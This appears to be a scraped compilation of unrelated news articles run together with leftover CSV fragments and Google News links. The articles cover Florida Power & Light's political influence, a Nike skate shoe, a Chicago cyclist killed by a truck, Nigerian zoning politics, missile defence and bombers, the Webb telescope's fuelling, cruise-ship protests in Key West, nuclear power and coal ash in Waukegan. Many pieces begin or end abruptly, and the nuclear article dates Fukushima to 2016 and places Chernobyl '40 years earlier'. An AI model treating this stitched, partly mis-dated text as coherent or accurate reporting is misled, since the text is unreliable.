""It's a huge opportunity for FPL given the political landscape to flex their political power on spending important relationship-building and direct political contributions before you even get to the stuff where it's a little bit more shady and buried in levels of political committees"" Schafer said in an interview. ""If you look at the comments that the company makes for example in their quarterly reports they talk about Florida as being a friendly regulatory environment. And that is very intentional. It's a result of the work that they have done to control the political environment.""

RELATED: Florida's largest power company made installing solar panels much harder

Schafer who has been following FPL's apparent skullduggery for several years now noted that the company has several levers of power when it comes to keeping Florida's legislature on the side of businesses rather than consumers.

One lever is exerting influence over the Florida Public Service Commission (FPSC) a five-member panel tasked with regulating the business practices of utility and telecommunications corporations throughout the state. A large part of FPSC's job is to keep FPL in check because the company has a monopoly on the state's utilities market. This is why the FPSC decides what rates the company is allowed to fairly charge its customers – a process that involves extensive accounting of the company's yearly costs.

Throughout 2019 and 2020 the FPSC approved numerous rate increases for FPL Tampa Electric Co. and Duke Energy. Just this week the FPSC likewise voted to let FPL collect an additional $810 million from customers in 2022 to account for the increasing cost of natural gas nationwide. According to The Daily Herald  FPL intends to increase the cost of electricity for its customers by roughly 20% over the next four years.

While there have been some instances in which the commission sides with consumers it's hard to argue that the FPSC is insulated from corporate interests. After all its five commissioners are appointed by the governor and confirmed by the state Senate which makes its composition a product of politics Liz Veazey Policy and Rural Energy Director at Solar United Neighbors told Salon.

""When you're solely focused on profits over people there's no limit to what utility companies will do to preserve their energy monopoly"" Veazey told Salon by email. ""The substantial influence that FPL and Duke Energy have over the state legislators and the governor … reduce[s] the ability of the government to fulfill its oversight role.""

On top of lobbying companies like FPL can also launder their interests through more public channels of campaign finance. For instance while Florida prohibits utilities companies from donating directly to candidates they can contribute to political action committees that align with business-friendly candidates.

According to The Sentinel in 2018 alone FPL made $8 million in campaign contributions to political action committees. But donations like these Veazey said ""are often only half of the story and fail to include all of the monies creatively funneled through political committees political parties and even charitable donations.""

FPL for its part has vehemently denied any suggestions that it financially supported ghost candidates.

""Neither FPL nor our employees provided funding or asked any third party to provide funding on its behalf to Grow United in support of Florida state-level political campaigns during the 2020 election cycle"" company spokesperson David P. Reuter told the Sentinel. ""Any report or suggestion that we had involvement in financially supported or directed others to support any 'ghost' candidates during the 2020 election cycle is patently false and we have found absolutely no evidence of any legal wrongdoing by FPL or its employees.""

RELATED: Florida protects solar: 5 lessons to learn from a major green energy win

Veazey told Salon that she found Reuter's statement ""elitist"" and ""absurd.""

""Their claim of ignorance of how the money was being spent is not an acceptable excuse for their funds being used to wreak havoc on the democratic process"" she added.

It isn't the first time that FPL has come under scrutiny for indirectly financing alleged sham candidates.

In 2018 Florida state Sen. Keith Perry a Republican won re-election against Democratic challenger Kayser Enneking largely due to the candidacy of independent Charles Goston. According to the Sentinel FPL donated $14.15 million to a political ad nonprofit whose consultants were affiliated with a group that paid for ads supporting Goston.

As curious as FPL's charitable decisions are it's not hard to see why an electricity retailer would get involved in political funding. FPL is facing a push for rooftop solar. Earlier this year state Democrats introduced a bill that would have saved schools businesses and nonprofit organizations from paying millions of dollars in up-front costs associated with solar installation. Solar United estimated that bill would have added 25000 new jobs with $4 billion in economic growth. In the end however the measure didn't even receive a hearing in the Republican-controlled legislature.

RELATED: Florida abandons clean energy: State votes to gut efficiency goals and end rooftop solar rebates

FPL and solar advocates have also locked horns over net metering a billing mechanism that allows solar users to collect credits for energy they generate but do not use. Currently net metering is legal in the Sunshine State. But that hasn't stopped Republicans from waging disinformation campaigns that overstate the costs associated with solar. ""Utilities are also actively working to spread disinformation about the benefits of solar imposing outrageous interconnection fees misrepresenting community solar imposing unfair minimum-monthly bills on solar customers and blocking policies that keep solar affordable and accessible"" Veazey explained.

Part of the problem with holding utility companies accountable Schafer said is that they're playing the long game. Thus connecting something like FPL's stance on net metering to their alleged support of ghost candidates involves untangling convoluted political projects spanning years.

""The process of putting [the] pieces together and understanding this web of dark money non-profits and entities shuffling money back and forth – that is very challenging to keep track of"" Schafer said. ""A lot of people say 'I don't get that stuff that's why I don't like politics.' But that sentiment right there is one of the things utilities companies are counting on. They know that it's confusing. They know that it's overwhelming. Most people just want to switch the light switch and have their lights on.""",,,,,,,,,,,,

Being one of the most talented skaters under the Nike SB umbrella it’s no surprise that Ishod Wair is receiving his very own signature shoe. Eponymously named the Nike SB Ishod has been teased in a number of clean colorways this one proffering a classic Black/Gum pairing.

Through the profile suede is the most dominant outfitting the forefoot as well as the heel in a dark yet somewhat faded finish. Across the vamp and mid-panel the wave-formed TPU appears far blacker matching the shade of the lace unit and lining. Gum is then added underfoot while white pops against the midsole walls and both the Ishod and Swoosh markings.

For a closer look at this newly revealed colorway check out the retailer images below. Though a release date has yet to be announced it shouldn’t be long before we see on the shelves of Nike.com and skate shops.

A GoFundMe page launched to help cover expenses has raised over $14500. A message on the page states that Jose was on his way home from school at Benito Juárez Community Academy when he was killed and describes him as a vivacious person who loved learning. This article has been edited accordingly.

With the death of Jose Velásquez 16 in Back of the Yards Friday morning yet another young life has tragically been cut short in Chicago by a truck driver who made a right turn without yielding to a person biking.

According to Police News Affairs on Friday December 10 at about 10:20 a.m. the truck driver was traveling south on 4000 block of South Ashland Avenue and made a right turn into a driveway striking Velásquez who was pronounced dead at the scene. The trucker was cited for failure to yield.

The police crash report includes additional information on the incident. It states that the truck driver a 33-year-old man who lives in southwest-suburban Montgomery and was operating a truck owned by Global Rental Co. told responding officers he was driving to the Norfolk Southern rail yard at 4008 South Ashland to park his vehicle. As he turned right into the driveway ""he heard a thump and felt a bump coming from the rear"" of the truck. The driver said he stopped and looked back via a side mirror and saw a black bicycle and what appeared to be a person's body and immediately exited the vehicle and walked towards the person lying in the driveway saw that he was injured and called 911.

The report states that after police arrived and the victim was pronounced dead ""the driver complied [with] all the required chemical test[s]."" His truck was towed to a police pound for investigation and he was taken to Mercy Hospital for DUI testing. However police were told by hospital staff that the hospital lost its contract with the city and is not currently stocking DUI tests and they released the trucker who left the hospital with his supervisor.

The diagram of the crash on the report indicates that Velásquez was biking on the sidewalk and was crossing the driveway when he was struck. If that was the case while it's illegal for people 12 or older to bike on the sidewalk in Chicago riding on the sidewalk in this location would have been an understandable choice since this stretch of Ashland has four lanes and high-speed traffic including many trucks and no bikeways. The nearest parallel street with bike lanes in this part of town is Halsted Street a mile east of Ashland.

Bike Lane Uprising an organization that documents bike lane obstructions noted on Twitter that the local fixed-gear Instagram account Chicago Fixies is planning a memorial for Velásquez on Saturday December 18 at 4:45 p.m. at the Damen Avenue plaza of The 606 elevated greenway 1775 North Damen. The plaza is a popular gathering spot for young fixed-gear riders. Attendees are asked to bring flowers candles and balloons. BLU arranged for a white-painted ""ghost bike"" memorial to be created. ""It truly hurts to know you're gone"" reads a post from Chicago Fixies. ""It hurts to know you passed while doing something you loved.""

The victim was at least the sixth person on a bike struck and killed by a turning trucker in Chicago since summer 2016. The other cases include:

Virginia Murray 25 fatally struck by a flatbed truck driver in Avondale in July 2016



Lisa Kuivinen 20 struck and killed by a flatbed truck driver in River West in August 2016



Anastasia Kondrasheva 23 fatally struck by a flatbed truck driver in Lakeview in September 2016



Angela Park 39 struck and killed by a dump truck driver in Greektown in August 2018



Carla Aiello 37 fatally struck by a dump truck driver in the Irving Park community in November 2019

In the wake of the three 2016 crashes in July 2017 Chicago’s City Council passed an ordinance requiring that any business with a city contract worth $2 million or more install side guards — hardware that helps prevent pedestrians and cyclists from going under the wheels — and convex mirrors on all trucks used to fulfill the contract that weigh 10000 pounds or more. The Council also earmark $5 million for retrofitting 1700 city vehicles with the safety gear.

In June 2020 the right-turning driver of a Chicago Department of Transportation struck a CDOT SAFE (Streets Are For Everybody) Ambassador on her bike in Avondale. While the woman was hospitalized in serious condition she was able to return home the next day possibly in part due to the fact the truck had side guards and convex mirrors.

It's not yet clear whether or not the truck from this latest crash had side guards or convex mirrors. But if this kind of safety gear was mandated on all large trucks more of these kinds of tragedies could be averted.

I am not exaggerating when I say my convex mirror bill is in my top five bills in terms of the vitriol & hyperbole I faced from opponents. And I say that as a veteran of gun control repro rights marriage equality & criminal justice reform bills. — Rep. Kelly Cassidy (@RepKellyCassidy) December 13 2021

In the past resistance from the trucking industry has been be a barrier to passing such legislation in Illinois. In 2012 the Active Transportation Alliance lobbied for a statewide law sponsored by state representative Kelly Cassidy requiring convex mirrors for the front of all large Illinois-licensed trucks. However the Illinois Trucking Association balked at the $500-per-vehicle cost and testified against the bill and the legislation died in committee.

Velásquez was the tenth person fatally struck by a driver while biking on Chicago streets this year. That's the most bike fatalities in our city since at least 2011. The previous recent record was nine bike fatalities in 2020. (There were four fatalities in 2019 not shown on the chart above.) The increase in bike deaths may be partly attributable to increased bicycling during the COVID-19 pandemic as well as more speeding by drivers during the crisis.

California is facing a severe housing crisis as rents and the price of homes skyrocket and the population surges.

In July the state's legislature passed a package of bills to address housing and homelessness and increase affordable housing. In it was $500 million which nonprofit organizations can use to preserve housing when foreclosure — or risk of foreclosure — bring tenants closer to eviction. These efforts include an affordable housing model — the community land trust — which is gaining steam across the country.

The ACCSON frowned at a statement purportedly credited to one Alhaji Yerima Shettima President of Arewa Consultative Youth Forum saying that “It is too late for the 2023 Presidency to be zoned to the South-East”.

In its own statement signed by Abdulsalam Mohammed Kazeem ACCSON said “It is indecorous and even outright provocative and inciting in nature. We strongly believe that no genuine democrat with sincere national interest and who cherishes the spirit of unity and corporate existence of Nigeria will utter such insensitive comments at this critical political time in our country.

“It is noteworthy to restate here that the position of our group calling for the rotational presidency among the six geo political zones of the country was as a result of our peculiar regional experiences. Both past and present crop of elected and appointed leaders from within our region have failed us completely. They have failed to meet up with the expectations of our people and have continued to betray our trust confidence and respect for them.

“For instance from 1999 to date (which is 22 years now) the North-West and North-East zones have produced president vice president secretary to the government of the federation senate presidents and speakers of the House of Representatives. The North-Central Zone alone has produced two senate presidents in 12 years; a deputy senate president and a deputy speaker of the House of Representatives.

“Our three zones of the Northern region in total have produced more ministers services chiefs and heads of governments agencies more than any other region yet there is nothing on ground to show for it.

“They only leverage on our population advantage which though is an added advantage in a democratic setting. The said population is only useful to our region during electioneering period. The major benefit of a population advantage in economics is that it remains attractive to both the multi- national and trans-national companies that would want to site industries in such location in other to maximise their market and get very cheap labour.

“Our Northern region today has been reduced to a human abattoir to say the least where all our communities have been converted to a mass grave due to the failure of government at all levels.

“For instance between October 2021 till date over 150 citizens of Northern extraction have been murdered by terrorists in Sokoto State alone not to talk of Zamfara Kebbi Kaduna Katsina Niger Benue Borno and Yobe states. Despite the claims by government that terrorism and violent insurgency is aggressively being fought the North has remained a killing field.

“Our country is about the highest importer of arms and ammunition in Africa and our region is seemingly the poverty capital of Nigeria yet our people occupied and are still occupying the most sensitive positions in government from 1999 till date.

“We are not sycophants of government but we are patriotic northerners too with history of respect for constituted authority and for our elders.

“It is therefore the position of our Northern umbrella youths coalition the Arewa Concerned Civil Society Organisations of Nigeria that since our people in leadership positions in Nigeria cannot bring development peace progress and prosperity to our region let us try people of other regions particularly the region or geo-political zone that has not produced a president or vice president of Nigeria in other to further promote fairness equity unity or oneness of the country.”",https://news.google.com/articles/CBMihAFodHRwczovL3d3dy5wcmVtaXVtdGltZXNuZy5jb20vbmV3cy90b3AtbmV3cy81MDA1NzMtYnVoYXJpLXRhY2tsZXMtZGFpbHktdHJ1c3Qtb3Zlci1jcml0aWNhbC1lZGl0b3JpYWwtb24taW5zZWN1cml0eS1pbi1uaWdlcmlhLmh0bWzSAQA?hl=en-US&gl=US&ceid=US%3Aen,Buhari tackles Daily Trust over critical editorial on insecurity in Nigeria,,https://news.google.com/articles/CBMijwFodHRwczovL3d3dy45bmV3cy5jb20uYXUvbmF0aW9uYWwvdmFuZGFscy1oYXZlLWFsbGVnZWQtZGFtYWdlZC1vdmVyLTkwLW1lbW9yaWFscy1hdC1hLWNlbWV0ZXJ5LWluLXZpY3RvcmlhLzc2NzNjNDk4LTFkMGMtNDAxMi1hN2M2LWNlY2FiN2MwYmY0MNIBRWh0dHBzOi8vYW1wLjluZXdzLmNvbS5hdS9hcnRpY2xlLzc2NzNjNDk4LTFkMGMtNDAxMi1hN2M2LWNlY2FiN2MwYmY0MA?hl=en-US&gl=US&ceid=US%3Aen,Vandals destroy headstones and smash grave statues at a cemetery in Victoria,"Over 90 memorials were destroyed by alleged vandals at the Northern Memorial Park in Glenroy Victoria .

But new data collected from live fires during experiments on ship-based Aegis radar models and ground systems have moved the schedule up.

The Missile Defense Agency (MDA) is fast-tracking design and concept work on an innovative technology intended to destroy hypersonic weapons moving at five times the speed of sound along the boundary of the earth’s atmosphere.

The Glide Phase Interceptor (GPI) program now moving into a new developmental phase is a Missile Defense Agency effort which just awarded development deals to Raytheon Northrop Grumman and Lockheed. The concept which will soon enter into digital design engineering and prototyping phases is based upon the ability to intercept attacking a hypersonic glide body during its glide phase of flight before it reenters the earth’s atmosphere.

A hypersonic boost-glide weapon flies beyond the earth’s atmosphere to glide at hypersonic speeds before descending on its target. Just before the missile begins its high-speed descent is the best opportunity to intercept it.

“So when you're in the glide phase -- which is higher up from the terminal right where a hypersonic vehicle is likely in its most vulnerable phase -- that's actually a pretty tough environment to be in” Navy Vice Adm. Jon Hill Director MDA told reporters earlier this year according to a Pentagon transcript. “And you can't take an air defense weapon and operate it there nor can you take a space weapon like an SM-3 and operate there it's just a different environment.”

Initial thoughts were that a GPI might not come to fruition until the 2030s Hill said. But new data collected from live fires during experiments on ship-based Aegis radar models and ground systems have moved the schedule up. Prototypes of the interceptor will integrate with the Aegis ship-based combat system which connects missile radar with fire control computing ship-based command and control and missile firing technology.

The GPI is expected to fire from the Vertical Launch Systems on the decks of Navy warships. While many details related to potential technologies for the program in the areas of propulsion guidance or speed are unavailable for security reasons it seems significant that there may be ways to track a hypersonic missile traveling between radar fields of view and then launch a kinetic interceptor quickly enough to destroy the weapon.

Hill said that the MDA is now “maturing technologies” and working with industry to evolve “seekers and materials for operating” in that portion of the atmosphere as well as exploring propulsion techniques to succeed in firing an interceptor capable of reaching and destroying an hypersonic weapon during its glide phase.

One reason why the possibility of intercepting a hypersonic weapon may become more realistic relates to an interesting technology called “launch on remote.” This means detection and tracking can take place somewhere farther way and not necessarily on the ship. Advanced sensing and networking technologies may enable radar systems to find a hypersonic missile and relay details to the ship’s fire control and launch systems.

Launch-on-remote became possible in recent years through upgrades to ship-integrated Aegis radar systems and networking developments enabling dispersed assets to pass targeting information and other crucial data to shoot off interceptors.

“We found that we can close the fire control loop with an Aegis ship that has already proven queuing launch-on-remote and engage on remote capability” Hill said.

US Air Force B-1B Lancer bomber

According to the Defense News website the 2022 National Defense Authorization Act will prevent the US Air Force from retiring strategic B-1B Lancer bombers until they are replaced with B-21 Raiders.

Earlier this week the US House of Representatives passed a revised version of the $768 billion defense budget measure for 2022.

With the exception of units that have begun fielding the new bomber the prohibition will extend until September 2023. Meanwhile Northrop Grumman a US defense corporation has already produced five B-21 bombers which will be delivered in the mid-2020s.

According to the news site 17 of the oldest Lancers have been retired due to their poor condition allowing the remaining 45 bombers to receive more focused maintenance.

The B-1B Lancer is a supersonic strategic bomber that serves as the backbone of the United States' long-range bomber force capable of rapidly delivering massive amounts of precision-guided and other weapons to any adversary anywhere in the globe at any time.

US B-21 bomber's expected cost $203 billion into the 2050s

US B-21 Strategic Bomber computer rendered image

According to estimates the next-generation B-21 stealth bomber program would cost taxpayers at least $203 billion to develop purchase and operate 100 aircraft over the next 30 years.

The figure is the most up-to-date estimate for Northrop Grumman Corporation's highly classified program which it won in 2015. It's also an attempt by the Air Force to follow through on a promise to help lawmakers avoid 'sticker shock' by disclosing more cost data as the stealth aircraft progresses through development.

According to Bloomberg News the total cost in the fiscal year 2019 dollars comprises $25.1 billion for development $64 billion for production and $114 billion for maintaining and operating a fleet of 100 bombers over a 30-year period.

The service had previously disclosed B-21 research and manufacturing expenses but not the program's 30-year operations and support expenditures which typically account for up to 70% of a program's total life-cycle cost.

In order to make critical course corrections shortly after launch to maintain its prescribed orbit nearly 1 million miles from Earth and to repoint the observatory and manage its momentum during operations Webb was built with a total of 12 rocket thrusters. These rocket thrusters use either hydrazine fuel or a special mixture of hydrazine fuel and dinitrogen tetroxide oxidizer.

To safely handle these extremely toxic propellants Webb was moved to the fueling section of the Ariane payload preparation facility at Europe’s Spaceport in French Guiana. Specialists wore Self-Contained Atmospheric Protective Ensemble or “SCAPE” suits while loading the observatory. The nearly 10-day procedure began November 25.

Webb’s spacecraft bus built by Northrop Grumman was filled with 369 pounds (168 kilograms) of hydrazine fuel and 292 pounds (133 kilograms) of dinitrogen tetroxide oxidizer. Both fuel and oxidizer will be used together to maximize power for the biggest “burns” by Webb’s Secondary Combustion Augmented Thrusters which are for mid-course corrections and inserting into L2 orbit as well as for orbit maintenance around L2 during the mission. However hydrazine alone will be used for the small “burns” by Webb’s tiny precision Monopropellant Reaction Engine thrusters which are used for large-angle repointing and for managing spacecraft momentum. The fuel loading system was formally disconnected on December 3 followed by inspections and closeouts that concluded over the weekend.

Combined operations between the Arianespace and NASA teams preparing Webb and its Ariane 5 rocket are now set to begin. The next large milestones for the joint teams will be to move Webb to the Bâtiment d’Assemblage Final (BAF) or Final Assembly Building; place it atop its rocket; and encapsulate it inside its protective fairing. With final closeouts complete the full stack of rocket and payload atop its mobile launch platform will be rolled out of the BAF to the launch pad two days before its scheduled December 22 launch.",https://news.google.com/articles/CBMiUGh0dHBzOi8vZGVmYnJpZWYuY29tLzIwMjEvMTIvMTIvYWZ0ZXItbmlnZXItdXMtZG9uYXRlcy1jLTEzMC1haXJjcmFmdC10by1qb3JkYW4v0gEA?hl=en-US&gl=US&ceid=US%3Aen,After Niger US donates C-130 aircraft to Jordan,"The United States transferred two of three C-130 transport aircraft to Jordan in a ceremony organized by the Royal Jordanian Air Force (RJAF) US Air Force and the US Embassy in Jordan on December 8.

The transfer took place a day after two C-130H Hercules were handed over to the Nigerien Armed Forces in Niamey.

Jordan has received two of the C-130 aircraft since September with the third scheduled for delivery in January.

The transfer of these mission-ready aircraft comes as part of a US Congressional mandate to cap the size of the USAF C-130 fleet. The C-130 ramp-to-ramp (R2R) transfer program is the first USAF program to transfer fully active and functional assets to key security partners around the world. R2R delivered its first aircraft in April 2021 and to date has delivered eight of a projected thirty aircraft globally.

“This donation of advanced aircraft represents the commitment of the United States to build strong capabilities of our Jordanian partners to respond immediately to any situation whether it is a natural disaster humanitarian crisis or operational mission” US ambassador Henry T. Wooster noted in his remarks.

The transfer of the USAF C-130 aircraft boosts RJAF fixed wing tactical airlift capability by nearly 50 percent and saves RJAF approximately $30 million in equipment renovation costs the US embassy said.

The three aircraft have received recent equipment updates and upgraded interoperable avionics and are being integrated now into the RJAF fleet. RJAF has been flying C-130s for over 50 years as a key component of its transport fleet. The C-130 fleet supports the Jordanian Armed Forces through airdropping equipment paratroopers and cargo but also non-military roles including support for disaster relief humanitarian missions and medical evacuation missions.

Last year within days of the tragic explosion in Beirut Jordanian C-130s were in the air delivering essential supplies to assist the Lebanese people. The RJAF Airlift Wing often deploy C-130s and Jordanian troops in support of UN and coalition operations in Africa and other regions.

In follow up to the C-130 transfer the USAF Mobile Training Team will provide basic and advanced training of Jordanian aircrew and maintenance crews."

Meanwhile about 20 small boats were in the harbor.

They waved flags carrying the logo of Safer Cleaner Ships the group that organized a petition drive that led to last year's referendum on regulating cruise ships.

More than 60% of Key West voters approved of limiting the number of people who could come to the island by cruise ship to 1500 people a day the capacity of ships at 1300 people and required the city to prioritize ships with the best health and safety records.

Those limits were overturned last spring by the state Legislature which passed a law banning the regulation of ports by voter initiatives.

The crowd chanted ""respect our vote!"" as the 915-foot Norwegian Dawn pulled in carrying 2134 people — 1061 passengers and 1073 crew members.

Erin Rust was there with a sign that said “we voted no.” She said local conditions improved during the 20 months the ships were not visiting the island.

""The quality of dives got a lot better the quality of fishing got a lot better it was back to like our island life down here and it was slow-paced like we like it"" said Rust. ""And having things this big and this many people here it does it takes away from the experience and it kind of ruins it. We want people to visit Key West just not thousands every day.""

Fellow protester Susan Rouf held a sign that said ""you are welcome — your ship is not.""

""Passengers I welcome them but please come by a smaller ship a safer ship a more environmentally sound ship"" she said. ""Save our reef.""

The cruise ships stir up plumes of sediment as they make their way into Key West Harbor via the shipping channel. It's an area fishermen say is crucial for fish making their way from the Gulf of Mexico into the Keys and the Straits of Florida.

And they say that silt smothers sea life that can't get away like seagrass and coral.

Tom McMurrain manages Pier B. He acknowledged that the cruise ships stir up the silt but said it dissipates ""pretty quick.""

He said the protesters just down the waterfront had the right to to express themselves.

""It's a democracy. They can protest they can do whatever they would like to do. That's their right"" McMurrain said.

But he said the primary causes of coral die-off are global warming development overfishing and coral disease — not cruise ships.

The Key West City Commission has been discussing for months how it could regulate cruise ships. Key West is a city-owned port so the commission is essentially the port authority.

The commission recently hired outside counsel to help draft new ordinances. A city workshop is planned for 5 p.m. Monday Dec. 13 with the sole agenda of providing guidance to the city manager and city attorney about cruise ships.",,,,,,,,,,,,

Others in the United States some European countries and Asia already are exploring the possibilities. CPS Energy did so too but permits authorized by the Nuclear Regulatory Commission were canceled in 2018 two years after preliminary studies by CPS were set aside after the nuclear plant disaster in Japan and the growing supply of cheap natural gas in Texas.

As retired nuclear naval submarine commander and San Antonio resident Mike Chapline wrote in an Aug. 10 2021 commentary here “The safety record of nuclear power in our region is without parallel. The South Texas Project has operated very safely and reliably throughout its lifetime with only three reactor trips in the past several years.”

CPS Energy derives 14% of the power it supplies from the South Texas Project located along the Texas Gulf Coast in Matagorda County. The local energy utility owns a 40% stake in STP while NRG Energy owns 44% and the city of Austin owns 14%. For more than three decades the plant has operated without major incident and helped CPS Energy keep electricity affordable and reliable.

Even during the winter storm and statewide power outage STP returned to full power on Feb. 18 after Unit One shut down in the freeze on Feb. 15. San Antonio would have endured far worse in February without that power.

Those who oppose nuclear energy here continue to benefit from it every day.

Nuclear expansion anywhere in the U.S. came to a halt in the wake of the 2016 disaster at Fukushima in Japan the second-worst nuclear disaster in history after Chernobyl 40 years earlier in 1986. The U.S. safety record has been unblemished since the Three Mile Island incident in Pennsylvania in 1979 a reactor core meltdown that resulted in a release of radioactive gases but no injuries or fatalities.

Nuclear opponents also cite the issue of spent nuclear fuel and question the reliability of its safe storage and possible conversion into future fuel sources for next-generation plants. Both sides of that debate are explored in this Scientific American article from 2009. I lean toward those who believe future technologies and innovation eventually will solve the problem.

What most CPS Energy ratepayers might not know is that work already is underway to design and build next-generation nuclear power plants known as small modular reactors which advocates say will be far less expensive to design and build than conventional reactors now in operation.

A Houston-Austin-San Antonio partnership would help spread development costs.

Here in the U.S. for example Microsoft founder Bill Gates is chairman of TerraPower based in Bellevue Washington and Warren Buffett is chairman of PacifiCorp a subsidiary of Berkshire Hathaway Energy which together are designing a small advanced reactor with salt storage in Wyoming the country’s leading coal producer.

In England Rolls Royce SMR is leading the way on planned nuclear expansion design and construction. French President Emmanuel Macron delivered a speech last month announcing France’s plans to expand its nuclear plant footprint as a way of meeting its carbon-neutral goals by 2050 — this in a country that already generates three-quarters of its power from nuclear.

Other European countries led by Germany oppose nuclear expansion in Europe. Politics rather than science in Europe and the U.S. will ultimately influence whether nuclear expansion accelerates in the coming decade or fails to gain traction.

China the world’s largest consumer of coal for energy generation is going forward with its plans to expand nuclear-generated power by 40% by 2025 which would mean nuclear solar and wind would account for 20% of that country’s energy use.

Dallas-based Texas 2036 founder Tom Luce and colleagues recently published a commentary urging the Texas energy sector to compete with other states for billions in energy diversification funds included in the recently passed Infrastructure Investment and Jobs Act. Nuclear expansion unfortunately is not mentioned.

San Antonio tech leader Lew Moorman publishes a periodic blog Movements Start Small that recently addressed climate change and called for a renewal of nuclear energy expansion.

Readers who want to access more information about the state of nuclear research and development in the U.S. can check out the Nuclear Regulatory Commission website. Closer to home doesn’t it make sense to add nuclear energy expansion to the conversation as CPS Energy searches for its next leader and a more sustainable energy portfolio?

Chicago Tribune

Chicago — Growing up in Waukegan Eduardo Flores didn’t think much about the presence of inhalers on his playground.

Every couple of months one of his classmates or a kid from a different grade would suffer an asthma attack while playing tag or soccer at recess.

“Whenever someone got an asthma attack I would always have to run and help get an inhaler” said Flores now 19. “It was such a normal thing to me as a child that I never questioned it.”

It wasn’t until Flores got involved with environmental activism that he realized there might be a reason for all the asthma cases in his community which is about 30 miles north of Chicago.

In Waukegan old factories from a closed asbestos manufacturing facility to an active gypsum factory sit discordantly alongside public beaches and forest preserves. Home to more than 86000 people the city contains five active Superfund sites. And on the shores of Lake Michigan sits the Waukegan Generating Station — a facility that has burned coal for decades ― and its coal ash ponds.

Coal ash a residual of combustion is made up of particles including heavy metals and radioactive elements that are turned into a slurry and dumped into coal ash ponds. In June 2019 the Illinois Pollution Control Board ruled that the facility violated environmental regulations and was responsible for groundwater contamination from its coal ash ponds in Waukegan and elsewhere.

Studies have also shown coal ash ponds can emit pollutants into the air possibly causing an increase in respiratory symptoms in the surrounding communities.

“I got older and realized hey asthma isn’t as prevalent in other areas. It’s prevalent here because we’re so close to the coal plant” said Flores who interns at Clean Power Lake County a community-driven coalition advocating for environmental economic and racial justice.

NRG the current owner said it plans to close the coal-fired units at the plant next year but battles continue over what to do with the coal ash ponds left from decades of production. Waukegan one of the most diverse cities in the Chicago area with more than half its residents identifying as Latino is one of several environmental justice communities the Chicago Tribune is visiting.

Activists and environmental organizations have been trying for years to improve the city for future generations through regulatory actions political lobbying and youth movements.

Flores said he plans to return after college because he loves his community — both for what it is and what it can be.

“There’s not a lot of people that want to come back. But the few that do want to come back?” Flores said. “They’re so passionate about it. And so that’s kind of like what gives me hope is knowing that you know hey there are people that want to improve this place.”

‘A beautiful community’

Dulce Ortiz moved to Waukegan when she was 10 years old after immigrating to the United States illegally. Now a co-chair of Clean Power Lake County and executive director of Mano a Mano Family Resource Center a Lake and McHenry county organization that helps immigrant families integrate into their neighborhood Ortiz has spent her entire career and much of her free time aiding the community.

Ortiz said she has never considered moving away from the city where her mother lives and where she hopes her own children will stay.

“It’s a beautiful community. And it has so much potential” Ortiz said. “This is such a beautiful city. We have a jewel of a lakefront and we just have to do a better job of ensuring that we get rid of all the industry that’s there.”

Ortiz said living near pollutants may have taken a toll on her and her family’s health. Ortiz’s mother developed adult-onset asthma after living for years near the plant. Due to her immigration status her mother did not have health insurance and had to pay out-of-pocket for an inhaler Ortiz said. Then Ortiz developed asthma in her late 20s despite being an avid runner.

There is little scientific research on the effects of coal ash on respiratory health; however several studies published in the past couple of years show that communities living near coal ash facilities are more likely to report respiratory symptoms than others.

Although Ortiz and Flores spent most of their lives in Waukegan neither knew for years that the huge factory complex just down the street from Waukegan’s downtown was a coal plant.

“I thought it was just like another factory” Flores said. “I felt betrayed by the school system honestly. I just I couldn’t believe that I’ve grown up in Waukegan my whole life and there had barely been a mention of the coal plant.”

Ortiz said the responsibility falls on residents to research environmental hazards like the coal plant.

As a culturally and economically diverse city nearly 80% of Waukegan’s residents are people of color and more than half are low-income. Many simply don’t have the bandwidth to fight on another front Ortiz said.

“It’s really unjust and unfair to have to burden communities of color with having to do advocacy in regards to environmental justice because environmental justice is one of the issues that we fight” Ortiz said. “And with Waukegan too how do you expect community members to come out and advocate when they’re working two or three jobs? These families are in survival mode.”

At the Waukegan Municipal Beach where residents frequently go to relax and have fun the top of the coal plant peeks out over the bluff. A nearby factory belches smoke into the sky and a web of mostly defunct railroad lines crisscross over the roads.

A sign on the beach warns fishers not to eat the fish due to the potentially toxic buildup of pollutants. Ortiz said she frequently sees people fishing by the lake: “I don’t think they’re doing it for enjoyment.”

What to clean up and how

Built by Commonwealth Edison in the 1960s the Waukegan coal plant is among dozens nationwide that started generating electricity before Congress passed the 1970 Clean Air Act. Midwest Generation bought the ComEd plants in 1999 and kept them running as a growing number of scientific studies found that coal plant pollution triggers asthma attacks causes heart disease and shaves years off lives. In 2014 NRG acquired Midwest Generation.

According to a report produced by the Environmental Integrity Project Earthjustice Prairie Rivers Network and the Sierra Club based on state records 22 of 24 of Illinois’ reporting coal-fired power plants have contaminated nearby groundwater with unsafe levels of toxic pollutants many of them near low-income communities.

In Waukegan the study found average concentrations of arsenic boron manganese chromium lithium molybdenum and sulfate exceeded health-based thresholds at publicly reported monitoring wells. The level to which these toxic chemicals have seeped into the community’s drinking water is unknown.

NRG announced this year it will close its Waukegan coal plant in June 2022. The decision came amid an ongoing regulatory battle that began in 2012.

Now the battle revolves around remediation — what coal ash to clean up and how.

New state regulations require energy companies to clean up sites contaminated with coal ash pollution. The dumps will be sealed or in some cases excavated and moved to licensed landfills. But state officials are allowing companies to suggest a preferred option to close each site then giving environmental groups and community leaders chances to challenge the industry’s plans at public hearings and in written comments.

NRG submitted plans for two coal ash ponds. One involves draining the liquid leaving the ash in place and capping it with layers of soil and drainage systems. The other would move the coal ash to a separate facility.

The complaint however also targets other less regulated sources of coal ash near the factories including a pond that was used before Midwest Generation and then NRG bought the plant and fill areas outside the ponds that contain coal ash.

Environmental organizations want the coal ash in those areas removed saying it too poses a risk to the community’s health.

“Based on the experience at Waukegan based on what we’ve seen from other Midwestern sites and elsewhere this coal ash as long as it continues to be exposed to water from groundwater flowing into it from below continues to pose a serious risk of contamination” said Jennifer Cassel senior attorney at Earthjustice. “And it’s clear that the liners are not stopping contamination. We think cap-in-place is a real problem.”

NRG spokesperson Dave Schrader said the company plans to present its coal ash closure plans during virtual public meetings Dec. 15 and 16.

“Our plans will comply with all applicable regulations approvals and implementation schedules and Midwest Generation (now owned by NRG) will focus on the well-being of the community the environment and maintaining communication with the public and other stakeholders” Schrader said in an emailed statement.

‘Joint values’

Much of the environmental advocacy in Waukegan began in or still exists within places of worship.

Clean Power began in downtown’s Christ Episcopal Church where the Rev. Eileen Shanley-Roberts was a founding member. Faith in Place a nonprofit that fosters green initiatives through faith communities operates throughout Illinois and has seven participating congregations in Waukegan.

